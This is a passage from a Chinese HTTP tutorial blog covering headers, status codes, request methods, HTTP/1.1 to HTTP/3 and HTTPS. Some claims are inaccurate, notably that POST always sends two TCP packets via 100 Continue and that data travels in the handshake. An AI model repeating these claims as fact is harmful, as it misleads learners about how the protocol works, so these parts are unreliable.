title="Connection字段"></a>Connection字段</h4><p>Connection字段最常用于<strong>客户端要求服务器使用TCP持久连接，以便其他请求复用</strong>。</p><p><strong>HTTP/1.1</strong>版本的默认连接都是<strong>持久连接</strong>，但为了<strong>兼容老版本的HTTP</strong>，需要指定<code>Connection</code>首部字段的值为<code>Keep-Alive</code>。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection : Keep-Alive</span><br></pre></td></tr></table></figure><p>一个可以复用的TCP连接就建立了，直到客户端或服务器主动关闭连接。但是，这不是标准字段。</p><h4 id="Content-Type字段"><a href="#Content-Type字段" class="headerlink" title="Content-Type字段"></a>Content-Type字段</h4><p><code>Content-Type</code>字段用于服务器回应时，告诉客户端，本次数据是什么格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text/html; charset=utf<span class="number">-8</span></span><br></pre></td></tr></table></figure><p>上面的类型表明，发送的是网页，而且编码是UTF-8。</p><p>客户端请求的时候，可以使用<code>Accept</code>字段声明自己可以接受哪些数据格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: *<span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>上面代码中，客户端声明自己可以接受任何格式的数据。</p><h4 id="Content-Encoding字段"><a href="#Content-Encoding字段" class="headerlink" title="Content-Encoding字段"></a>Content-Encoding字段</h4><p>Content-Encoding 字段说明数据的<strong>压缩</strong>方法。表示服务器返回的数据使用了什么压缩格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Encoding : gzip</span><br></pre></td></tr></table></figure><p>上面表示服务器返回的数据采用了gzip方式压缩，告知客户端需要用此方式解压。</p><p>客户端在请求时，用<code>Accept-Encoding</code>字段说明自己可以接受哪些压缩方法。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure><h3 id="响应报文包括："><a href="#响应报文包括：" class="headerlink" title="响应报文包括："></a>响应报文包括：</h3><p><a href="https://imgtu.com/i/5KMPXD"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://z3.ax1x.com/2021/10/13/5KMPXD.jpg" alt="5KMPXD.jpg"></a></p><ul><li>状态行：HTTP协议及版本、状态码及状态描述。</li><li>响应头</li><li>空行</li><li>响应体</li></ul><h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><p><a href="https://imgtu.com/i/btsdSg"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btsdSg.png" alt="btsdSg.png"></a></p><h4 id="1xx"><a href="#1xx" class="headerlink" title="1xx"></a>1xx</h4><p><strong>1xx</strong>类状态码属于提示信息，是协议处理中的一种中间状态，实际用到的比较少。</p><h4 id="2xx"><a href="#2xx" class="headerlink" title="2xx"></a>2xx</h4><p><strong>2xx</strong>类状态码表示服务器<strong>成功</strong>处理了客户端的请求，也是我们最愿意看到的状态。</p><ul><li><strong>200 OK</strong> 是最常见的成功状态码，表示一切正常。如果是非<code>HEAD</code>请求，服务器返回的响应头都会有<code>body</code>数据。</li><li><strong>204 No Content</strong> 也是常见的成功状态码，与200 OK基本相同，但响应头没有body数据。</li><li>**206 Partial Content **是应用于HTTP分块下载或断点续传，表示响应返回的body数据并不是资源的全部，而是其中的一部分，也是服务器处理成功的状态。</li></ul><h4 id="3xx"><a href="#3xx" class="headerlink" title="3xx"></a>3xx</h4><p><strong>3xx</strong>类状态码表示客户端请求的资源发送了变动，需要客户端用新的URL重新发送请求获取资源，也就是<strong>重定向</strong>。</p><ul><li><p><strong>301 Moved Permanently</strong> 表示<strong>永久重定向</strong>，说明请求的资源已经不存在了，需改用新的URL再次访问。</p></li><li><p><strong>302 Found</strong> 表示<strong>临时重定向</strong>，说明请求的资源还在，但暂时需要用另一个URL来访问。</p><ul><li><strong>301</strong>和<strong>302</strong>都会在响应头里使用字段<strong>Location</strong>，指明后续要跳转的URL，浏览器会自动重定向新的URL。</li></ul></li><li><p><strong>304 Not Modified</strong> 不具有跳转的含义，表示资源未修改，重定向已存在的缓冲文件，也称<strong>缓存重定向</strong>，用于缓存控制。</p></li></ul><h4 id="4xx"><a href="#4xx" class="headerlink" title="4xx"></a>4xx</h4><p><strong>4xx</strong>类状态码表示客户端发送的<strong>报文有误</strong>，服务器无法处理，也就是<strong>错误码</strong>的含义。</p><ul><li><strong>400 Bad Request</strong> 表示客户端请求的报文有错误，但只是个笼统的错误</li><li><strong>403 Forbidden</strong> 表示<strong>服务器禁止访问资源</strong>，并不是客户端的请求出错。</li><li><strong>404 Not Found</strong> 表<strong>示请求的资源在服务器上不存在或未找到</strong>，所以无法提供给客户端。</li></ul><h4 id="5xx"><a href="#5xx" class="headerlink" title="5xx"></a>5xx</h4><p><strong>5xx</strong>类状态码表示客户端请求报文正确，但是<strong>服务器处理时内部发生了错误</strong>，属于<strong>服务器端的错误码</strong>。</p><ul><li><strong>500 Internal Server Error</strong> 与400类型，是个笼统通用的错误码，服务器发生了什么错误，我们并不知道。</li><li><strong>501 Not lmplemented</strong> 表示客户端请求的功能还不支持，类似“即将开业，敬请期待”的意思。</li><li><strong>502 Bad Gateway</strong> 通常是服务器作为网关或代理时返回的错误码，表示服务器自身工作正常，访问后端服务器发生了错误。</li><li><strong>503 Service Unavailable</strong> 表示<strong>服务器当前很忙，暂时无法响应服务器</strong>,类似“网络服务正忙，请稍后重试”的意思。</li></ul><h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><p>根据 HTTP 标准，HTTP 请求可以使用多种请求方法。</p><p>HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD 方法。</p><p>HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。</p><p>根据场景合理使用各个方法，可以起到优化性能、增加网络安全的效果。</p><h3 id="GET-与-POST"><a href="#GET-与-POST" class="headerlink" title="GET 与 POST"></a>GET 与 POST</h3><h4 id="简要概述"><a href="#简要概述" class="headerlink" title="简要概述"></a>简要概述</h4><p><code>GET</code>方法的含义是<strong>请求从服务器获取资源</strong>，这个资源可以是静态的文本、页面、图片视频等。</p><p>比如，你打开我的文章，浏览器就会发送GET请求给服务器，服务器就会返回文章的所有文字及资源。</p><p>而<code>POST</code>方法则是相反操作，它向<code>URI</code>指定的资源提交数据，数据就放在报文的<code>body</code>里。</p><p>比如，你在我文章底部，敲入了留言后点击「提交」，浏览器就会执行一次POST请求，把你的留言文字放进了报文body里，然后拼接好POST请求头，通过TCP协议发送给服务器。</p><h4 id="安全和幂等"><a href="#安全和幂等" class="headerlink" title="安全和幂等"></a>安全和幂等</h4><p>先说明下安全和幂等的概念:</p><ul><li>在HTTP 协议里，<strong>所谓的「安全」是指请求方法不会「破坏」服务器上的资源</strong>。</li><li><strong>所谓的「幂等」，意思是多次执行相同的操作，结果都是「相同」的。</strong></li></ul><p>那么很明显<strong>GET方法就是安全且幂等</strong>的，因为它是「只读」操作，无论操作多少次，服务器上的数据都是安全的，且每次的结果都是相同的。</p><p><strong>POST</strong>因为是「新增或提交数据」的操作，会修改服务器上的资源，所以是<strong>不安全</strong>的，且多次提交数据就会创建多个资源，所以不<strong>是幂等</strong>的。</p><h4 id="参数传递方式"><a href="#参数传递方式" class="headerlink" title="参数传递方式"></a>参数传递方式</h4><p>这一点应该是我们能够最直观地观察到的。</p><ul><li>GET 的参数一般是通过 <code>?</code> 跟在 URL 后面的，多个参数通过 <code>&amp;</code> 连接，比如：<code>www.example.com?serach=bianchengsanmei&amp;content=123</code>。</li><li>POST 的参数一般是包含在 <code>request body</code> 中的</li></ul><blockquote><p>其实，这个区别不是绝对的，GET 也可以通过 params 携带参数，而 POST 的URL 后面也可以携带参数，只是我们通常不建议这么做而已。</p></blockquote><h4 id="安全性不同（传输的角度）"><a href="#安全性不同（传输的角度）" class="headerlink" title="安全性不同（传输的角度）"></a>安全性不同（传输的角度）</h4><p>因为参数传递方式的不同，所以 GET 和 POST 的安全性不同：GET 比 POST 更不安全，因为参数直接暴露在URL上，所以 GET 不能用来传递敏感信息。</p><blockquote><p>从传输的角度来说，他们都是不安全的，因为 HTTP 在网络上是明文传输的，只要在网络节点上捉包，就能完整地获取数据报文，要想安全传输，就只有加密，也就是 HTTPS。</p></blockquote><h4 id="参数长度限制不同"><a href="#参数长度限制不同" class="headerlink" title="参数长度限制不同"></a>参数长度限制不同</h4><p>GET 和 POST 传递参数的长度不同：</p><ul><li>get传送的数据量较小，不能大于2KB。</li><li>post传送的数据量较大，一般被默认为不受限制。</li></ul><p>在这里我们要明确一点：<strong>HTTP 协议没有 Body 和 URL 的长度限制，对 URL 限制的大多是浏览器和服务器的原因。</strong></p><p>服务器是因为处理长 URL 要消耗比较多的资源，为了性能和安全（防止恶意构造长 URL 来攻击）考虑，会给 URL 长度加限制。</p><h4 id="参数数据类型不同"><a href="#参数数据类型不同" class="headerlink" title="参数数据类型不同"></a>参数数据类型不同</h4><p>参数的数据类型，GET 只接受 ASCII 字符，而 POST 没有限制。</p><h4 id="编码方式不同"><a href="#编码方式不同" class="headerlink" title="编码方式不同"></a>编码方式不同</h4><p>GET 请求只能进行 URL 编码（application/x-www-form-urlencoded）</p><p>POST 支持多种编码方式（application/x-www-form-urlencoded 或 multipart/form-data。为二进制数据使用多种编码。）</p><h4 id="缓存机制不同"><a href="#缓存机制不同" class="headerlink" title="缓存机制不同"></a>缓存机制不同</h4><p>这个需要从以下几点来说明：</p><ul><li>GET 请求会<strong>被浏览器主动cache</strong>，而 POST 不会，除非手动设置。</li><li>GET 请求参数<strong>会被完整保留在浏览器历史记录里</strong>，而 POST 中的参数不会被保留。</li><li>GET 产生的 URL 地址可以被 Bookmark，而 POST 不可以。</li><li>GET 在<strong>浏览器回退时是无害的</strong>，而 POST 会再次提交请求。</li></ul><h4 id="时间消耗不同"><a href="#时间消耗不同" class="headerlink" title="时间消耗不同"></a>时间消耗不同</h4><p>GET 和 POST 请求时间的不同主要是因为：</p><ul><li>GET 产生<strong>一个</strong> TCP 数据包；</li><li>POST 产生<strong>两个</strong> TCP 数据包。</li></ul><p>对于 GET 方式的请求，浏览器会把 <strong>header 和 data</strong> 一并发送出去，服务器响应 200（返回数据）；而对于 POST，浏览器先发送 <strong>header</strong>，服务器响应 <strong>100 continue</strong>，浏览器再发送 <strong>data</strong>，服务器响应 200 ok（返回数据），详细分析一下：</p><h5 id="POST-请求的过程："><a href="#POST-请求的过程：" class="headerlink" title="POST 请求的过程："></a>POST 请求的过程：</h5><ol><li>浏览器请求 TCP 连接（第一次握手）</li><li>服务器答应进行 TCP 连接（第二次握手）</li><li>浏览器确认，并发送 POST 请求头（第三次握手，这个报文比较小，所以 HTTP 会在此时进行第一次数据发送）</li><li>服务器返回100 Continue响应</li><li>浏览器发送数据</li><li>服务器返回 200 OK响应</li></ol><h5 id="GET-请求的过程："><a href="#GET-请求的过程：" class="headerlink" title="GET 请求的过程："></a>GET 请求的过程：</h5><ol><li>浏览器请求 TCP 连接（第一次握手）</li><li>服务器答应进行 TCP 连接（第二次握手）</li><li>浏览器确认，并发送 GET 请求头和数据（第三次握手，这个报文比较小，所以 HTTP 会在此时进行第一次数据发送）</li><li>服务器返回 200 OK响应</li></ol><blockquote><p>在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。</p></blockquote><h3 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h3><p>与 GET 方法一样，都是向服务器发出指定资源的请求，只不过服务器将不传回资源的本文部分，只返回头部消息。</p><p>HEAD 方法的使用场景</p><ul><li>在不获取资源的情况下，了解资源的一些信息，比如资源类型；</li><li>通过查看响应中的状态码，可以确定资源是否存在；</li><li>通过查看首部，测试资源是否被修改。</li></ul><h3 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h3><p>PUT 方法用于将数据发送到服务器来创建/更新资源。</p><p>PUT 与 POST 方法的区别在于，<strong>PUT 方法是幂等的</strong>：<strong>调用一次与连续调用多次是等价的（即没有副作用）</strong>，而连续调用多次 POST 方法可能会有副作用，比如将一个订单重复提交多次。</p><h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><p>DELETE 方法就是请求服务器删除指定 URL 所对应的资源。</p><p>但是，客户端无法保证删除操作一定会被执行，因为 HTTP 规范允许服务器在不通知客户端的情况下撤销请求。</p><h3 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h3><p>TRACE 方法实现沿通向目标资源的路径的消息“回环”（loop-back）测试 ，提供了一种实用的 debug 机制。</p><p>请求的最终接收者应当原样反射（reflect）它接收到的消息，作为一个 Content-Type 为  message/http 的200（OK）响应的消息的主体（body）返回给客户端 。</p><blockquote><p>最终接收者是指初始（origin）服务器，或者第一个接收到  Max-Forwards  值为 0的请求的服务器。</p></blockquote><p>我们都知道，客户端在发起一个请求时，这个请求可能要穿过防火墙、代理、网关、或者其它的一些应用程序。这中间的每个节点都可能会修改原始的 HTTP 请求。由于有一个“回环”诊断，在请求最终到达服务器时，服务器会弹回一条 TRACE 响应，并在响应主体中携带它收到的原始请求报文的最终模样。这样客户端就可以查看 HTTP 请求报文在发送的途中，是否被修改过了。</p><h3 id="PATCH"><a href="#PATCH" class="headerlink" title="PATCH"></a>PATCH</h3><p>在HTTP协议中，请求方法 PATCH 用于对资源进行部分修改。</p><p>在HTTP协议中， PUT 方法已经被用来表示对资源进行整体覆盖， 而 POST 方法则没有对标准的补丁格式的提供支持。不同于 PUT 方法，而与 POST 方法类似，PATCH 方法是非幂等的，这就意味着连续多个的相同请求会产生不同的效果。</p><p>要判断一台服务器是否支持 PATCH  方法，那么就看它是否将其添加到了响应首部 Allow 或者 Access-Control-Allow-Methods （在跨域访问的场合，CORS）的方法列表中 。</p><p>另外一个支持 PATCH 方法的隐含迹象是 Accept-Patch 首部的出现，这个首部明确了服务器端可以接受的补丁文件的格式。</p><h3 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h3><p>OPTIONS 方法用于获取目的资源所支持的通信选项。</p><p>客户端可以对特定的 URL 使用 OPTIONS 方法，也可以对整站（通过将 URL 设置为“*”）使用该方法。</p><p>若请求成功，则它会在 HTTP 头中包含一个名为 “Allow” 的头，值是所支持的方法，如 “GET, POST”。</p><h3 id="CONNECT"><a href="#CONNECT" class="headerlink" title="CONNECT"></a>CONNECT</h3><p>CONNECT 方法可以开启一个客户端与所请求资源之间的双向沟通的通道。它可以用来创建隧道（tunnel）。</p><h2 id="HTTP特性"><a href="#HTTP特性" class="headerlink" title="HTTP特性"></a>HTTP特性</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>HTTP最凸出的优点是<strong>简单、灵活和易于扩展、应用广泛和跨平台</strong>。</p><p><strong>简单</strong></p><p>HTTP基本的报文格式就是 <code>header + body</code> ，头部信息也是<code>key-value</code>简单文本的形式，易于理解，降低了学习和使用的门槛。</p><p><strong>灵活和易于扩展</strong></p><p>HTTP协议里的各类请求方法、URIURL、状态码、头字段等每个组成要求都没有被固定死，都允许开发人员自定义和扩充。</p><p>同时HTTP由于是工作在**应用层(OSI第七层)**，则它下层可以随意变化。</p><p>HTTPS也就是在HTTP与TCP层之间增加了SSLTLS安全传输层，HTTP/3甚至把TCP层换成了基于UDP的QUIC。</p><p><strong>应用广泛和跨平台</strong></p><p>互联网发展至今，HTTP的应用范围非常的广泛，从台式机的浏览器到手机上的各种 APP，从看新闻、刷贴吧到购物、理财、吃鸡，HTTP的应用片地开花，同时天然具有跨平台的优越性。</p><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>HTTP协议里有优缺点一体的<strong>双刃剑</strong>，分别是<strong>无状态、明文传输</strong>，同时还有一大缺点<strong>不安全</strong>。</p><h4 id="无状态双刃剑"><a href="#无状态双刃剑" class="headerlink" title="无状态双刃剑"></a>无状态双刃剑</h4><p>无状态的<strong>好处</strong>，因为服务器不会去记忆HTTP的状态，所以<strong>不需要额外的资源来记录状态信息，这能减轻服务器的负担，能够把更多的CPU和内存用来对外提供服务。</strong></p><p>无状态的<strong>坏处</strong>，既然服务器没有记忆能力，它在<strong>完成有关联性的操作时会非常麻烦</strong>。</p><p>例如登录-&gt;添加购物车-&gt;下单-&gt;结算-&gt;支付，这系列操作都要知道用户的身份才行。但服务器不知道这些请求是有关联的，每次都要问一遍身份信息。</p><p>这样每操作一次，都要验证信息，这样的购物体验还能愉快吗?别问，问就是酸爽!</p><p>对于无状态的问题，解法方案有很多种，其中比较简单的方式用<strong>Cookie</strong>技术。</p><p><strong>Cookie通过在请求和响应报文中写入Cookie 信息来控制客户端的状态。</strong></p><p>相当于，在客户端第一次请求后，服务器会下发一个装有客户信息的「小贴纸」，后续客户端请求服务器的时候，带上「小贴纸」，服务器就能认得了。</p><p><a href="https://imgtu.com/i/bts0yj"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/bts0yj.png" alt="bts0yj.png"></a></p><h4 id="明文传输双刃剑"><a href="#明文传输双刃剑" class="headerlink" title="明文传输双刃剑"></a>明文传输双刃剑</h4><p>明文意味着在传输过程中的信息，是可方便阅读的，通过浏览器的F12控制台或Wireshark抓包都可以直接肉眼查看，为我们<strong>调试工作带了极大的便利性。</strong></p><p>但是这正是这样，HTTP的所有信息都暴露在了光天化日下，相当于信息裸奔。在传输的漫长的过程中，信息的内容都<strong>毫无隐私可言，很容易就能被窃取</strong>，如果里面有你的账号密码信息，那你号没了。</p><h4 id="不安全"><a href="#不安全" class="headerlink" title="不安全"></a>不安全</h4><p>HTTP比较严重的缺点就是不安全:</p><ul><li><strong>通信使用明文（不加密)，内容可能会被窃听。</strong>比如，账号信息容易泄漏，那你号没了。</li><li><strong>不验证通信方的身份</strong>，因此有可能遭遇伪装。比如，访问假的淘宝、拼多多，那你钱没了。</li><li><strong>无法证明报文的完整性</strong>，所以有可能已遭篡改。比如，网页上植入垃圾广告，视觉污染，眼没了。</li></ul><p>HTTP的安全问题，可以用<strong>HTTPS</strong>的方式解决，也就是通过引入<strong>SSL/TLS</strong>层，使得在安全上达到了极致。</p><h3 id="HTTP-1-1的性能"><a href="#HTTP-1-1的性能" class="headerlink" title="HTTP/1.1的性能"></a>HTTP/1.1的性能</h3><p>HTTP协议是基于TCP/IP，并且使用了「请求-应答」的通信模式，所以性能的关键就在这两点里。</p><h4 id="长连接"><a href="#长连接" class="headerlink" title="长连接"></a>长连接</h4><p>早期HTTP/1.0性能上的一个很大的问题，那就是<strong>每发起一个请求，都要新建一次TCP连接（三次握手)，而且是串行请求，做了无谓的TCP连接建立和断开，增加了通信开销。</strong></p><p>为了解决上述TCP连接问题，HTTP/1.1提出了<strong>长连接</strong>的通信方式，也叫<strong>持久连接</strong>。这种方式的好处在于<strong>减少了TCP连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。</strong></p><p>持久连接的特点是，<strong>只要任意一端没有明确提出断开连接，则保持TCP连接状态。</strong></p><p><a href="https://imgtu.com/i/btsckV"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btsckV.png" alt="btsckV.png"></a></p><h4 id="管道网络传输"><a href="#管道网络传输" class="headerlink" title="管道网络传输"></a>管道网络传输</h4><p>HTTP/1.1采用了长连接的方式，这使得<strong>管道(pipeline)网络传输</strong>成为了可能。</p><p>即可在同一个TCP连接里面，客户端可以发起多个请求，只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以<strong>减少整体的响应时间</strong>。</p><p>举例来说，客户端需要请求两个资源。以前的做法是，在同一个TCP连接里面，先发送A请求，然后等待服务器做出回应，收到后再发出B请求。管道机制则是允许浏览器同时发出A请求和B请求。</p><p>但是服务器还是按照顺序，先回应A请求，完成后再回应B请求。要是前面的回应特别慢，后面就会有许多请求排队等着。这称为<strong>队头堵塞</strong>。</p><p>总之HTTP/1.1的性能一般般，后续的 HTTP/2和HTTP/3就是在优化HTTP的性能。</p><h3 id="HTTP-1-1、HTTP-2、HTTP-3演变"><a href="#HTTP-1-1、HTTP-2、HTTP-3演变" class="headerlink" title="HTTP/1.1、HTTP/2、HTTP/3演变"></a>HTTP/1.1、HTTP/2、HTTP/3演变</h3><h4 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h4><p>HTTP/1.1相比HTTP/1.0性能上的改进︰</p><ul><li>使用TCP<strong>长连接</strong>的方式改善了HTTP/1.0短连接造成的性能开销。</li><li>支持<strong>管道（pipeline)网络传输</strong>，只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以减少整体的响应时间。</li></ul><p>但HTTP/1.1还是有性能瓶颈︰</p><ul><li><strong>请求/响应头部(Header)未经压缩就发送</strong>，首部信息越多延迟越大。只能压缩<code>Body</code>的部分;</li><li><strong>发送冗长的首部</strong>。每次互相发送相同的首部造成的浪费较多;</li><li>服务器是按请求的顺序响应的，如果服务器响应慢，会招致客户端一直请求不到数据，也就是<strong>队头阻塞</strong>;</li><li><strong>没有请求优先级控制</strong>;</li><li>请求只能从客户端开始，<strong>服务器只能被动响应</strong>。</li></ul><h4 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h4><p><strong>HTTP/2协议是大多基于HTTPS的，所以HTTP/2的安全性也是有保障的。</strong></p><p>那HTTP/2相比HTTP/1.1 性能上的改进︰</p><h5 id="头部压缩"><a href="#头部压缩" class="headerlink" title="头部压缩"></a>头部压缩</h5><p>HTTP/2会<strong>压缩头</strong>(Header)。如果你同时发出多个请求，他们的头是一样的或是相似的，那么，协议会帮你<strong>消除重复的部分</strong>。</p><p>这就是所谓的 <strong>HPACK算法</strong>:在客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就<strong>提高速度</strong>了。</p><h5 id="二进制格式"><a href="#二进制格式" class="headerlink" title="二进制格式"></a>二进制格式</h5><p>HTTP/2不再像HTTP/1.1里的纯文本形式的报文，而是全面采用了<strong>二进制格式</strong>，头信息和数据体都是二进制，并且统称为帧(frame)︰<strong>头信息帧</strong>和<strong>数据帧</strong>。</p><p>这样虽然对人不友好，但是对计算机非常友好，因为计算机只懂二进制，那么收到报文后，无需再将明文的报文转成二进制，而是直接解析二进制报文，这<strong>增加了数据传输的效率</strong>。</p><h5 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h5><p>HTTP/2的数据包<strong>不是按顺序发送的</strong>，同一个连接里面连续的数据包，可能属于不同的回应。因此，必须要对数据包做标记，指出它属于哪个回应。</p><p>每个请求或回应的所有数据包，称为一个数据流（<strong>Stream</strong> )。每个数据流都标记着一个独一无二的编号，其中规定客户端发出的数据流编号为奇数，服务器发出的数据流编号为偶数。</p><p>客户端还可以<strong>指定数据流的优先级</strong>。优先级高的请求，服务器就先响应该请求。</p><h5 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h5><p>HTTP/2是可以在<strong>一个连接中并发多个请求或回应，而不用按照顺序一一对应</strong>。</p><p>移除了HTTP/1.1中的串行请求，不需要排队等待，也就不会再出现「队头阻塞」问题，<strong>降低了延迟，大幅度提高了连接的利用率</strong>。</p><p>举例来说，在一个TCP连接里，服务器收到了客户端A和B的两个请求，如果发现A处理过程非常耗时，于是就回应A请求已经处理好的部分，接着回应B请求，完成后，再回应A请求剩下的部分。</p><h5 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h5><p>HTTP/2还在一定程度上改善了传统的「请求-应答」工作模式，服务不再是被动地响应，也可以主动向客户端发送消息。</p><p>举例来说，在浏览器刚请求HTML的时候，就提前把可能会用到的JS、CSS 文件等静态资源主动发给客户端，<strong>减少延时的等待</strong>，也就是服务器推送(<strong>Server Push</strong>，也叫<strong>Cache Push</strong>)。</p><h4 id="HTTP-3"><a href="#HTTP-3" class="headerlink" title="HTTP/3"></a>HTTP/3</h4><p>HTTP/2主要的问题在于，<strong>多个HTTP请求在复用一个TCP连接</strong>，下层的TCP协议是不知道有多少个HTTP请求的。</p><p>所以<strong>一旦发生了丢包现象，就会触发TCP的重传机制</strong>，这样在一个TCP连接中的<strong>所有的HTTP请求都必须等待这个丢了的包被重传回来</strong>。</p><ul><li>HTTP/1.1中的管道（ pipeline)传输中如果有一个请求阻塞了，那么队列后请求也统统被阻塞住了</li><li>HTTP/2多个请求复用一个TCP连接，一旦发生丢包，就会阻塞住所有的HTTP请求</li></ul><p>这都是基于TCP传输层的问题，所以<strong>HTTP/3把HTTP下层的TCP协议改成了UDP</strong>!</p><p><a href="https://imgtu.com/i/btsh6J"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btsh6J.png" alt="btsh6J.png"></a></p><p>UDP是<strong>不管顺序，也不管丢包的</strong>，所以不会出现HTTP/1.1的队头阻塞和HTTP/2的一个丢包全部重传问题。</p><p>大家都知道UDP是不可靠传输的，但<strong>基于UDP的QUIC协议可以实现类似TCP的可靠性传输</strong>。</p><ul><li>QUIC有自己的一套机制可以保证传输的可靠性的。当某个流发生丢包时，只会阻塞这个流，<strong>其他流不会受到影响</strong>。</li><li>TLS3升级成了最新的<strong>1.3</strong>版本，头部压缩算法也升级成了<strong>QPack</strong> 。</li><li>HTTPS要建立一个连接，要花费6次交互，先是建立三次握手，然后是TLS/1.3的三次握手。QUIC直接把以往的TCP和 TLS/1.3的6次交互<strong>合并成了3次，减少了交互次数</strong>。</li></ul><p>所以，QUIC是一个在UDP之上的<strong>伪</strong>TCP+ TLS+ HTTP/2的多路复用的协议。</p><p><a href="https://imgtu.com/i/btsHk6"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btsHk6.png" alt="btsHk6.png"></a></p><p>QUIC是新协议，对于很多网络设备，根本不知道什么是QUIC，只会当做UDP，这样会出现新的问题。所以HTTP/3现在普及的进度非常的缓慢，不知道未来UDP是否能够逆袭TCP。</p><h2 id="HTTP和HTTPS"><a href="#HTTP和HTTPS" class="headerlink" title="HTTP和HTTPS"></a>HTTP和HTTPS</h2><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ul><li>HTTP是<strong>超文本传输协议</strong>，信息是<strong>明文传输</strong>，存在安全风险的问题。HTTPS则解决HTTP不安全的缺陷，<strong>在TCP和HTTP之间加入了SSL/TLS安全协议</strong>，使得报文能够<strong>加密</strong>传输。</li><li>HTTP 连接建立相对简单，<strong>TCP三次握手</strong>之后便可进行HTTP的报文传输。而 HTTPS在<strong>TCP三次握手</strong>之后，还需进行<strong>SSL/TLS的握手</strong>过程，才可进入加密报文传输。</li><li>HTTP的端口号是<strong>80</strong>，HTTPS的端口号是<strong>443</strong>。</li><li>HTTPS 协议需要<strong>向CA(证书权威机构）申请数字证书</strong>，来保证服务器的身份是可信的。</li></ul><blockquote><p>SSL和TLS？</p></blockquote><p>这两实际上是一个东西。</p><p><strong>SSL</strong>是洋文<code>Secure Sockets Layer</code>的缩写，中文叫做<strong>安全套接层</strong>。它是在上世纪90年代中期，由网景公司设计的。</p><p>到了1999年，SSL因为应用广泛，已经成为互联网上的事实标准。IETF就在那年把SSL标准化。</p><p>标准化之后的名称改为<strong>TLS</strong>(是<code>Transport Layer Security</code>的缩写)，中文叫做<strong>传输层安全协议</strong>。</p><p>很多相关的文章都把这两者并列称呼(SSL/TLS)，因为这两者可以视作同一个东西的不同阶段。</p><h3 id="HTTP安全风险"><a href="#HTTP安全风险" class="headerlink" title="HTTP安全风险"></a>HTTP安全风险</h3><p>HTTP由于是明文传输，所以安全上存在以下三个风险:</p><ul><li><strong>窃听</strong>风险，比如通信链路上可以获取通信内容，用户号容易没。</li><li><strong>篡改</strong>风险，比如强制植入垃圾广告，视觉污染，用户眼容易瞎。</li><li><strong>冒充</strong>风险，比如冒充淘宝网站，用户钱容易没。</li></ul><h3 id="HTTPS解决方案"><a href="#HTTPS解决方案" class="headerlink" title="HTTPS解决方案"></a>HTTPS解决方案</h3><p><strong>HTTPS</strong>在HTTP与TCP层之间加入了 <strong>SSL/TLS</strong> 协议，可以很好的解决了上述的风险:</p><ul><li><strong>混合加密</strong>的方式实现信息的<strong>机密性</strong>，解决了<strong>窃听</strong>的风险。</li><li><strong>摘要算法</strong>的方式来实现<strong>完整性</strong>，它能够为数据生成独一无二的「指纹」，指纹用于<strong>校验数据的完整性</strong>，解决了<strong>篡改</strong>的风险。</li><li>将服务器公钥放入到<strong>数字证书</strong>中，解决了<strong>冒充</strong>的风险。</li></ul><h4 id="混合加密"><a href="#混合加密" class="headerlink" 